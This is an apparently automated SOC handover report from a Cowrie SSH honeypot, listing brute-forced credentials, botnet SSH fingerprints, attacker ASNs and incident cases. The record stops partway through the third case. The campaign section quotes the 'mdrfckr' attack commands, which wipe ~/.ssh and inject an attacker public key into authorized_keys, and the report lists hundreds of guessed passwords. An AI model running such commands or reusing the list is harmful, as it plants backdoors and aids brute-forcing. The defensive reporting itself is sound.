# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-09 |
| **Generated At** | 2026-08-09T05:11:28Z |
| **Shift Time** | 05:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **89** |
| Confirmed Threats | **55** |
| False Positives Filtered | **34** (38.2%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **24** |
| High Severity Cases | **25** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **64** |
| Malware Samples Analyzed | **3** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **268** |
| Unique Credential Pairs | **250** |
| Unique Usernames | **12** |
| Unique Passwords | **248** |
| Successful Auth Pairs | **264** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 236 |
| `test` | 6 |
| `Unknown` | 5 |
| `support` | 4 |
| `administrator` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 6 |
| `555555555` | 5 |
| `support` | 4 |
| `123456789` | 4 |
| `user12` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `Unknown` | `555555555` | 5 |
| `support` | `support` | 4 |
| `test` | `123456789` | 4 |
| `administrator` | `admin` | 3 |
| `admin` | `admin` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `10.0.0.73` | 2026-08-09T02:59:15 |
| `user` | `user12` | `122.187.229.220` | 2026-08-09T03:00:32 |
| `user` | `user12` | `60.249.252.94` | 2026-08-09T03:00:46 |
| `root` | `$ecurity!` | `10.0.0.73` | 2026-08-09T03:11:58 |
| `root` | `Admini12345` | `10.0.0.73` | 2026-08-09T03:16:39 |
| `test` | `123456789` | `10.0.0.73` | 2026-08-09T03:16:51 |
| `root` | `a@@` | `10.0.0.73` | 2026-08-09T03:18:25 |
| `test` | `123456789` | `196.189.126.10` | 2026-08-09T03:18:27 |
| `root` | `Qq123!*` | `10.0.0.73` | 2026-08-09T03:20:09 |
| `root` | `Chrome.123` | `10.0.0.73` | 2026-08-09T03:20:26 |
| `jc` | `jc123` | `68.183.113.3` | 2026-08-09T03:20:45 |
| `root` | `!!Aa1123!` | `10.0.0.73` | 2026-08-09T03:20:47 |
| `345gs5662d34` | `345gs5662d34` | `68.183.113.3` | 2026-08-09T03:20:48 |
| `jc` | `3245gs5662d34` | `68.183.113.3` | 2026-08-09T03:20:48 |
| `root` | `GuestUser123` | `10.0.0.73` | 2026-08-09T03:22:02 |
| `root` | `a!12345` | `10.0.0.73` | 2026-08-09T03:22:17 |
| `app` | `password` | `40.83.182.122` | 2026-08-09T03:23:35 |
| `345gs5662d34` | `345gs5662d34` | `40.83.182.122` | 2026-08-09T03:23:37 |
| `app` | `3245gs5662d34` | `40.83.182.122` | 2026-08-09T03:23:37 |
| `root` | `!qwe` | `10.0.0.73` | 2026-08-09T03:23:53 |
| `root` | `System@4321` | `10.0.0.73` | 2026-08-09T03:25:35 |
| `root` | `P@ssword01234` | `10.0.0.73` | 2026-08-09T03:26:05 |
| `root` | `Qwexsw@123` | `10.0.0.73` | 2026-08-09T03:26:09 |
| `root` | `!@#$4321` | `10.0.0.73` | 2026-08-09T03:26:36 |
| `root` | `@Admin1234567890` | `10.0.0.73` | 2026-08-09T03:27:06 |
| `root` | `Passw0rdqaz` | `10.0.0.73` | 2026-08-09T03:27:34 |
| `ubnt` | `3333333` | `10.0.0.73` | 2026-08-09T03:28:21 |
| `root` | `temp@1234` | `10.0.0.73` | 2026-08-09T03:28:26 |
| `root` | `p@s$word.123` | `10.0.0.73` | 2026-08-09T03:28:55 |
| `root` | `ZXC123123` | `10.0.0.73` | 2026-08-09T03:30:47 |
| `root` | `P@ssword)!@#` | `10.0.0.73` | 2026-08-09T03:31:59 |
| `root` | `admin!123@` | `10.0.0.73` | 2026-08-09T03:32:09 |
| `root` | `h@me.!` | `10.0.0.73` | 2026-08-09T03:33:41 |
| `root` | `qazwsxedc!@#` | `10.0.0.73` | 2026-08-09T03:33:55 |
| `root` | `ro0t` | `10.0.0.73` | 2026-08-09T03:34:19 |
| `test` | `123456789` | `116.72.9.151` | 2026-08-09T03:34:45 |
| `test` | `123456789` | `111.70.32.49` | 2026-08-09T03:34:58 |
| `root` | `p@55w0rds1234` | `10.0.0.73` | 2026-08-09T03:35:09 |
| `root` | `P@55w0rd@123` | `10.0.0.73` | 2026-08-09T03:35:21 |
| `root` | `P@$$word0123456` | `10.0.0.73` | 2026-08-09T03:36:14 |
| `root` | `Welcome@4321` | `10.0.0.73` | 2026-08-09T03:36:30 |
| `root` | `Letmein@` | `10.0.0.73` | 2026-08-09T03:36:34 |
| `root` | `654321a..` | `10.0.0.73` | 2026-08-09T03:37:31 |
| `root` | `123456b` | `10.0.0.73` | 2026-08-09T03:38:23 |
| `root` | `Qq123456789!` | `10.0.0.73` | 2026-08-09T03:38:33 |
| `root` | `!@#asd123` | `10.0.0.73` | 2026-08-09T03:39:35 |
| `root` | `qwer123456789` | `10.0.0.73` | 2026-08-09T03:40:08 |
| `root` | `adminadmin1234` | `10.0.0.73` | 2026-08-09T03:40:11 |
| `root` | `adm!n#123` | `10.0.0.73` | 2026-08-09T03:40:21 |
| `root` | `!@#!@#$` | `10.0.0.73` | 2026-08-09T03:40:52 |
| `root` | `!@#123abc` | `10.0.0.73` | 2026-08-09T03:41:16 |
| `root` | `QWERTY$#@!` | `10.0.0.73` | 2026-08-09T03:41:32 |
| `root` | `QQqq.123456` | `10.0.0.73` | 2026-08-09T03:41:53 |
| `root` | `P@55w0rd!@#$` | `10.0.0.73` | 2026-08-09T03:42:31 |
| `root` | `123.123` | `10.0.0.73` | 2026-08-09T03:42:49 |
| `root` | `Chrome123!` | `10.0.0.73` | 2026-08-09T03:43:23 |
| `root` | `Qq1234567@` | `10.0.0.73` | 2026-08-09T03:43:41 |
| `test` | `Welcome1` | `221.120.57.125` | 2026-08-09T03:43:42 |
| `test` | `Welcome1` | `182.75.197.174` | 2026-08-09T03:43:51 |
| `root` | `Qwe123;` | `10.0.0.73` | 2026-08-09T03:44:19 |
| `root` | `Pa$$w0rd@123456` | `10.0.0.73` | 2026-08-09T03:44:48 |
| `root` | `P@$$w0rd/.,` | `10.0.0.73` | 2026-08-09T03:45:06 |
| `root` | `Qwer@123!@#` | `10.0.0.73` | 2026-08-09T03:45:25 |
| `root` | `123@Ab` | `10.0.0.73` | 2026-08-09T03:45:39 |
| `ubnt` | `3333333` | `65.20.138.3` | 2026-08-09T03:45:39 |
| `root` | `Qwer123456!` | `10.0.0.73` | 2026-08-09T03:45:46 |
| `root` | `Qweqwe~124` | `10.0.0.73` | 2026-08-09T03:46:15 |
| `root` | `adm1n1strat0r!@#$%` | `10.0.0.73` | 2026-08-09T03:46:21 |
| `root` | `@dmin12345678910` | `10.0.0.73` | 2026-08-09T03:46:36 |
| `root` | `Qwe12345!@#` | `10.0.0.73` | 2026-08-09T03:47:04 |
| `root` | `12345-Abc` | `10.0.0.73` | 2026-08-09T03:47:09 |
| `root` | `Admin1233` | `10.0.0.73` | 2026-08-09T03:47:44 |
| `root` | `Qaz123!@@` | `10.0.0.73` | 2026-08-09T03:48:04 |
| `root` | `Qq12345678@` | `10.0.0.73` | 2026-08-09T03:48:27 |
| `root` | `home@.` | `10.0.0.73` | 2026-08-09T03:48:38 |
| `root` | `asd321` | `10.0.0.73` | 2026-08-09T03:48:56 |
| `root` | `A123456789!` | `10.0.0.73` | 2026-08-09T03:49:01 |
| `root` | `p@$$!` | `10.0.0.73` | 2026-08-09T03:49:38 |
| `root` | `Q!1234!Q` | `10.0.0.73` | 2026-08-09T03:49:55 |
| `root` | `Asd_asd123` | `10.0.0.73` | 2026-08-09T03:50:12 |
| `root` | `qazwsx321` | `10.0.0.73` | 2026-08-09T03:50:14 |
| `root` | `123!ASD` | `10.0.0.73` | 2026-08-09T03:50:43 |
| `root` | `Passqwe123456789` | `10.0.0.73` | 2026-08-09T03:51:03 |
| `root` | `Admin@abc!` | `10.0.0.73` | 2026-08-09T03:51:40 |
| `root` | `123456Qwe!` | `10.0.0.73` | 2026-08-09T03:51:42 |
| `root` | `P@ssword00` | `10.0.0.73` | 2026-08-09T03:51:52 |
| `root` | `A100100` | `10.0.0.73` | 2026-08-09T03:52:00 |
| `root` | `qwerty123456789` | `10.0.0.73` | 2026-08-09T03:52:12 |
| `root` | `Admin0.1.2.3` | `10.0.0.73` | 2026-08-09T03:52:27 |
| `root` | `_admin-admin` | `10.0.0.73` | 2026-08-09T03:52:35 |
| `root` | `1q2w.1234` | `10.0.0.73` | 2026-08-09T03:52:37 |
| `root` | `admini$trat0r` | `10.0.0.73` | 2026-08-09T03:53:45 |
| `root` | `Qwer123~` | `10.0.0.73` | 2026-08-09T03:54:03 |
| `root` | `123AbCd` | `10.0.0.73` | 2026-08-09T03:54:35 |
| `root` | `$Etup1234567` | `10.0.0.73` | 2026-08-09T03:55:06 |
| `root` | `123456123456!` | `10.0.0.73` | 2026-08-09T03:55:31 |
| `root` | `$root$` | `10.0.0.73` | 2026-08-09T03:55:51 |
| `root` | `qwe@asd` | `10.0.0.73` | 2026-08-09T03:56:07 |
| `root` | `1q2w3e4r.123` | `10.0.0.73` | 2026-08-09T03:56:19 |
| `root` | `ASDqaz123!@#` | `10.0.0.73` | 2026-08-09T03:56:22 |
| `root` | `!@#asdzxc` | `10.0.0.73` | 2026-08-09T03:56:55 |
| `root` | `Admin_123.` | `10.0.0.73` | 2026-08-09T03:56:58 |
| `root` | `P@word!` | `10.0.0.73` | 2026-08-09T03:57:36 |
| `root` | `bo$$` | `10.0.0.73` | 2026-08-09T03:57:52 |
| `root` | `adm!n_123` | `10.0.0.73` | 2026-08-09T03:58:05 |
| `root` | `qweasd321` | `10.0.0.73` | 2026-08-09T03:58:11 |
| `root` | `A_1234` | `10.0.0.73` | 2026-08-09T03:58:30 |
| `root` | `Shadow!@#123` | `10.0.0.73` | 2026-08-09T03:59:19 |
| `administrator` | `admin` | `10.0.0.73` | 2026-08-09T03:59:19 |
| `root` | `P@$$word_123` | `10.0.0.73` | 2026-08-09T03:59:36 |
| `root` | `win)2012` | `10.0.0.73` | 2026-08-09T04:00:12 |
| `root` | `23456~!@#` | `10.0.0.73` | 2026-08-09T04:00:22 |
| `root` | `A.123456` | `10.0.0.73` | 2026-08-09T04:01:40 |
| `root` | `!@zxc` | `10.0.0.73` | 2026-08-09T04:02:29 |
| `root` | `Password0)` | `10.0.0.73` | 2026-08-09T04:02:42 |
| `openvpn` | `openvpn` | `10.0.0.73` | 2026-08-09T04:02:51 |
| `root` | `Guest@123` | `10.0.0.73` | 2026-08-09T04:03:08 |
| `root` | `qw.!@` | `10.0.0.73` | 2026-08-09T04:03:39 |
| `root` | `123QWEzaqWSX` | `10.0.0.73` | 2026-08-09T04:03:41 |
| `root` | `p@5sw0rd` | `10.0.0.73` | 2026-08-09T04:03:58 |
| `root` | `!@!` | `10.0.0.73` | 2026-08-09T04:04:09 |
| `root` | `!@@!` | `10.0.0.73` | 2026-08-09T04:04:14 |
| `root` | `123Qweqaz$%^` | `10.0.0.73` | 2026-08-09T04:04:35 |
| `support` | `support` | `176.53.159.196` | 2026-08-09T04:04:59 |
| `root` | `Server!@#$%^` | `10.0.0.73` | 2026-08-09T04:05:04 |
| `root` | `Pa55w0rd.123` | `10.0.0.73` | 2026-08-09T04:05:18 |
| `root` | `Aa@123456` | `10.0.0.73` | 2026-08-09T04:05:20 |
| `root` | `12345678-Abc` | `10.0.0.73` | 2026-08-09T04:05:53 |
| `root` | `123ASD!@#123` | `10.0.0.73` | 2026-08-09T04:05:59 |
| `root` | `Qweasd@123.` | `10.0.0.73` | 2026-08-09T04:06:14 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-09T04:06:46 |
| `root` | `Shadow123!@#` | `10.0.0.73` | 2026-08-09T04:06:49 |
| `root` | `Pass0123456` | `10.0.0.73` | 2026-08-09T04:07:10 |
| `root` | `A@123456` | `10.0.0.73` | 2026-08-09T04:07:10 |
| `root` | `Admin:123` | `10.0.0.73` | 2026-08-09T04:08:05 |
| `root` | `Admin.0okm` | `10.0.0.73` | 2026-08-09T04:08:17 |
| `root` | `user!@#$%^&` | `10.0.0.73` | 2026-08-09T04:09:05 |
| `root` | `Asdf!@#$123456` | `10.0.0.73` | 2026-08-09T04:09:11 |
| `root` | `Admin.123321` | `10.0.0.73` | 2026-08-09T04:09:46 |
| `root` | `pa55w0rd.@` | `10.0.0.73` | 2026-08-09T04:10:21 |
| `root` | `!QAZqweQWE` | `10.0.0.73` | 2026-08-09T04:10:37 |
| `root` | `1234(qwer` | `10.0.0.73` | 2026-08-09T04:10:37 |
| `root` | `P@$sword.123` | `10.0.0.73` | 2026-08-09T04:10:49 |
| `root` | `P@55w0rd.0` | `10.0.0.73` | 2026-08-09T04:11:02 |
| `root` | `admin!@#!` | `10.0.0.73` | 2026-08-09T04:11:11 |
| `root` | `Pa$$s0rd1234` | `10.0.0.73` | 2026-08-09T04:11:13 |
| `root` | `123#ABC!@#` | `10.0.0.73` | 2026-08-09T04:11:43 |
| `root` | `aaa123!@#` | `10.0.0.73` | 2026-08-09T04:11:47 |
| `root` | `R00tRoot123` | `10.0.0.73` | 2026-08-09T04:12:01 |
| `root` | `!@#qweasdzxc123` | `10.0.0.73` | 2026-08-09T04:12:59 |
| `root` | `win*2012` | `10.0.0.73` | 2026-08-09T04:13:04 |
| `root` | `Pa$$wrd!` | `10.0.0.73` | 2026-08-09T04:13:21 |
| `root` | `123A!!` | `10.0.0.73` | 2026-08-09T04:13:44 |
| `root` | `qwer!.` | `10.0.0.73` | 2026-08-09T04:14:02 |
| `root` | `Pass_1qaz` | `10.0.0.73` | 2026-08-09T04:14:05 |
| `root` | `P@$sword@123` | `10.0.0.73` | 2026-08-09T04:14:35 |
| `root` | `R00tAdm!n!@#` | `10.0.0.73` | 2026-08-09T04:15:31 |
| `root` | `ASDqaz!@#123` | `10.0.0.73` | 2026-08-09T04:15:47 |
| `root` | `Qazwsx@112233` | `10.0.0.73` | 2026-08-09T04:16:33 |
| `root` | `Abcde123` | `10.0.0.73` | 2026-08-09T04:16:53 |
| `root` | `1qaz@1qaz123` | `10.0.0.73` | 2026-08-09T04:17:13 |
| `root` | `p@sswd!@#123` | `10.0.0.73` | 2026-08-09T04:18:01 |
| `administrator` | `admin` | `36.135.62.103` | 2026-08-09T04:18:08 |
| `administrator` | `admin` | `65.20.133.56` | 2026-08-09T04:18:16 |
| `root` | `W3llc0me` | `10.0.0.73` | 2026-08-09T04:18:21 |
| `root` | `~!@#$%123` | `10.0.0.73` | 2026-08-09T04:18:31 |
| `root` | `M1cr0s0ft!@#` | `10.0.0.73` | 2026-08-09T04:18:39 |
| `root` | `Server.` | `10.0.0.73` | 2026-08-09T04:19:12 |
| `root` | `123456@admin` | `10.0.0.73` | 2026-08-09T04:19:28 |
| `root` | `asdfgh!.` | `10.0.0.73` | 2026-08-09T04:20:04 |
| `admin` | `admin` | `223.85.251.61` | 2026-08-09T04:20:07 |
| `root` | `123ewqasd` | `10.0.0.73` | 2026-08-09T04:20:18 |
| `root` | `123!@#-EDC` | `10.0.0.73` | 2026-08-09T04:20:23 |
| `root` | `P@ssw00rd123` | `10.0.0.73` | 2026-08-09T04:21:06 |
| `root` | `$Company` | `10.0.0.73` | 2026-08-09T04:21:44 |
| `root` | `pa55w0rds1234` | `10.0.0.73` | 2026-08-09T04:22:19 |
| `root` | `Admin123**` | `10.0.0.73` | 2026-08-09T04:22:36 |
| `root` | `z!123` | `10.0.0.73` | 2026-08-09T04:24:26 |
| `root` | `Pass@w0rd@` | `10.0.0.73` | 2026-08-09T04:24:30 |
| `root` | `12345wsx` | `10.0.0.73` | 2026-08-09T04:25:03 |
| `root` | `Amministr@tor1234` | `10.0.0.73` | 2026-08-09T04:25:41 |
| `root` | `!!ADMIN$$` | `10.0.0.73` | 2026-08-09T04:25:42 |
| `Unknown` | `555555555` | `10.0.0.73` | 2026-08-09T04:25:46 |
| `root` | `123456_` | `10.0.0.73` | 2026-08-09T04:25:53 |
| `root` | `A@123123` | `10.0.0.73` | 2026-08-09T04:26:14 |
| `root` | `$erver_123` | `10.0.0.73` | 2026-08-09T04:26:24 |
| `root` | `a1b2s3` | `10.0.0.73` | 2026-08-09T04:26:29 |
| `root` | `QWE@qwe@12345` | `10.0.0.73` | 2026-08-09T04:27:21 |
| `Unknown` | `555555555` | `103.68.22.115` | 2026-08-09T04:27:26 |
| `Unknown` | `555555555` | `220.180.166.214` | 2026-08-09T04:27:37 |
| `root` | `Administr@tor@.` | `10.0.0.73` | 2026-08-09T04:27:39 |
| `root` | `P@ssword.1234` | `10.0.0.73` | 2026-08-09T04:28:28 |
| `root` | `user@!` | `10.0.0.73` | 2026-08-09T04:28:40 |
| `root` | `Pass123456_` | `10.0.0.73` | 2026-08-09T04:29:13 |
| `root` | `qweasd.123` | `10.0.0.73` | 2026-08-09T04:29:25 |
| `root` | `Admin.23` | `10.0.0.73` | 2026-08-09T04:29:50 |
| `root` | `Password$$$` | `10.0.0.73` | 2026-08-09T04:30:18 |
| `root` | `Admin^123` | `10.0.0.73` | 2026-08-09T04:31:14 |
| `root` | `Passw0rd2wsx` | `10.0.0.73` | 2026-08-09T04:31:25 |
| `root` | `!@#/abcd` | `10.0.0.73` | 2026-08-09T04:32:05 |
| `root` | `P@55w0rd_.` | `10.0.0.73` | 2026-08-09T04:32:18 |
| `root` | `A123!!` | `10.0.0.73` | 2026-08-09T04:32:24 |
| `root` | `Password!@#` | `10.0.0.73` | 2026-08-09T04:32:42 |
| `root` | `123!VPS` | `10.0.0.73` | 2026-08-09T04:32:50 |
| `root` | `Abc_123@` | `10.0.0.73` | 2026-08-09T04:32:53 |
| `root` | `P@ssw0rd_abc` | `10.0.0.73` | 2026-08-09T04:32:58 |
| `root` | `Adm!` | `10.0.0.73` | 2026-08-09T04:33:12 |
| `root` | `123qwer` | `10.0.0.73` | 2026-08-09T04:33:27 |
| `root` | `aaa!123` | `10.0.0.73` | 2026-08-09T04:33:30 |
| `root` | `1q2w3e4r~` | `10.0.0.73` | 2026-08-09T04:34:03 |
| `root` | `Pa$$word...` | `10.0.0.73` | 2026-08-09T04:34:11 |
| `root` | `Asd1234!@` | `10.0.0.73` | 2026-08-09T04:34:17 |
| `root` | `123456!@#zxc` | `10.0.0.73` | 2026-08-09T04:35:02 |
| `root` | `qwe321` | `10.0.0.73` | 2026-08-09T04:35:19 |
| `root` | `Qq123%` | `10.0.0.73` | 2026-08-09T04:35:42 |
| `root` | `Admin.black` | `10.0.0.73` | 2026-08-09T04:36:23 |
| `root` | `Qwer123^` | `10.0.0.73` | 2026-08-09T04:36:29 |
| `root` | `p@ssw0rd@.` | `10.0.0.73` | 2026-08-09T04:37:17 |
| `root` | `Qwe.Asd.123` | `10.0.0.73` | 2026-08-09T04:37:32 |
| `root` | `Password_!@` | `10.0.0.73` | 2026-08-09T04:37:51 |
| `root` | `upload123` | `10.0.0.73` | 2026-08-09T04:38:07 |
| `root` | `Pass123456@` | `10.0.0.73` | 2026-08-09T04:38:12 |
| `root` | `Admin@abc` | `10.0.0.73` | 2026-08-09T04:38:26 |
| `root` | `P@$$w0rd-12345` | `10.0.0.73` | 2026-08-09T04:39:42 |
| `root` | `ftptest@123` | `10.0.0.73` | 2026-08-09T04:40:49 |
| `root` | `asdfghjk!` | `10.0.0.73` | 2026-08-09T04:41:06 |
| `root` | `123321qwer1234` | `10.0.0.73` | 2026-08-09T04:41:10 |
| `root` | `P@ssw@rd` | `10.0.0.73` | 2026-08-09T04:41:24 |
| `root` | `Passw0rd01234` | `10.0.0.73` | 2026-08-09T04:41:25 |
| `root` | `P@$$w0rd123!@#` | `10.0.0.73` | 2026-08-09T04:42:29 |
| `root` | `Server!!@` | `10.0.0.73` | 2026-08-09T04:42:34 |
| `root` | `c0ntact.@` | `10.0.0.73` | 2026-08-09T04:43:21 |
| `Unknown` | `555555555` | `93.177.157.179` | 2026-08-09T04:43:41 |
| `root` | `aaaa!1234` | `10.0.0.73` | 2026-08-09T04:45:27 |
| `root` | `1234aaaa!!!!` | `10.0.0.73` | 2026-08-09T04:45:33 |
| `root` | `q1w2e3r` | `10.0.0.73` | 2026-08-09T04:45:44 |
| `root` | `A!S@D#F$` | `10.0.0.73` | 2026-08-09T04:46:05 |
| `root` | `Pass@w0rd!@#` | `10.0.0.73` | 2026-08-09T04:46:58 |
| `root` | `Qwe123.4` | `10.0.0.73` | 2026-08-09T04:47:10 |
| `root` | `p@ssword!@#$%` | `10.0.0.73` | 2026-08-09T04:47:25 |
| `root` | `P@word!@#` | `10.0.0.73` | 2026-08-09T04:47:54 |
| `root` | `Pas5word!` | `10.0.0.73` | 2026-08-09T04:48:02 |
| `root` | `123456qweQWE.` | `10.0.0.73` | 2026-08-09T04:48:09 |
| `root` | `Asd123)` | `10.0.0.73` | 2026-08-09T04:48:24 |
| `root` | `P@55WORD1234` | `10.0.0.73` | 2026-08-09T04:48:46 |
| `root` | `Asdf123:` | `10.0.0.73` | 2026-08-09T04:48:49 |
| `root` | `A1234567890` | `10.0.0.73` | 2026-08-09T04:49:02 |
| `root` | `qwer@.` | `10.0.0.73` | 2026-08-09T04:49:32 |
| `root` | `Pass12345678_` | `10.0.0.73` | 2026-08-09T04:49:51 |
| `root` | `Qaz_!@#$%^` | `10.0.0.73` | 2026-08-09T04:49:54 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-09T04:49:56 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-09T04:49:56 |
| `root` | `!!qwerty123!!` | `10.0.0.73` | 2026-08-09T04:50:25 |
| `root` | `R00tus3r!@#` | `10.0.0.73` | 2026-08-09T04:50:36 |
| `root` | `root123!` | `10.0.0.73` | 2026-08-09T04:51:08 |
| `root` | `1q2w3e4r5t`` | `10.0.0.73` | 2026-08-09T04:51:34 |
| `root` | `123123123` | `65.20.158.10` | 2026-08-09T04:52:19 |
| `root` | `QWWqww!@#123` | `10.0.0.73` | 2026-08-09T04:52:34 |
| `root` | `Qwerty.sys!@#` | `10.0.0.73` | 2026-08-09T04:53:11 |
| `root` | `PA$$WORD12345` | `10.0.0.73` | 2026-08-09T04:53:32 |
| `root` | `zxcv!.` | `10.0.0.73` | 2026-08-09T04:54:08 |
| `root` | `Qq12345678!` | `10.0.0.73` | 2026-08-09T04:54:29 |
| `root` | `QAZ2wsx` | `10.0.0.73` | 2026-08-09T04:54:45 |
| `root` | `wsxzaq!@` | `10.0.0.73` | 2026-08-09T04:54:57 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **89** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 16 |
| libssh | 10 |
| Go SSH scanner | 3 |
| Paramiko (Python) | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 16 | 16 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `a2de0f306611...` | Mirai/variant | 2 | 1 |
| `2aec6b44b06b...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 16 | 16 | Mirai/variant |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 1 | — |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `68.183.113.3`, `40.83.182.122`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **44** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 5 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS12389` | PJSC Rostelecom | 3 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (25)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7ce38f611a7a

| Field | Detail |
|---|---|
| **Source IP** | `122.187.229[.]220` |
| **First Seen** | 2026-08-09 03:00 |
| **Last Seen** | 2026-08-09 03:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:00:29` | `cowrie.session.connect` |
| `2026-08-09 03:00:30` | `cowrie.client.version` |
| `2026-08-09 03:00:30` | `cowrie.client.kex` |
| `2026-08-09 03:00:32` | `cowrie.login.success` |
| `2026-08-09 03:00:33` | `cowrie.direct-tcpip.request` |
| `2026-08-09 03:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.229[.]220` to AbuseIPDB if not already reported
- [ ] Block `122.187.229[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f352b418a2fa

| Field | Detail |
|---|---|
| **Source IP** | `60.249.252[.]94` |
| **First Seen** | 2026-08-09 03:00 |
| **Last Seen** | 2026-08-09 03:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:00:43` | `cowrie.session.connect` |
| `2026-08-09 03:00:43` | `cowrie.client.version` |
| `2026-08-09 03:00:43` | `cowrie.client.kex` |
| `2026-08-09 03:00:46` | `cowrie.login.success` |
| `2026-08-09 03:00:47` | `cowrie.direct-tcpip.request` |
| `2026-08-09 03:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.252[.]94` to AbuseIPDB if not already reported
- [ ] Block `60.249.252[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8baa71100d4

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-08-09 03:18 |
| **Last Seen** | 2026-08-09 03:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:18:25` | `cowrie.session.connect` |
| `2026-08-09 03:18:26` | `cowrie.client.version` |
| `2026-08-09 03:18:26` | `cowrie.client.kex` |
| `2026-08-09 03:18:27` | `cowrie.login.success` |
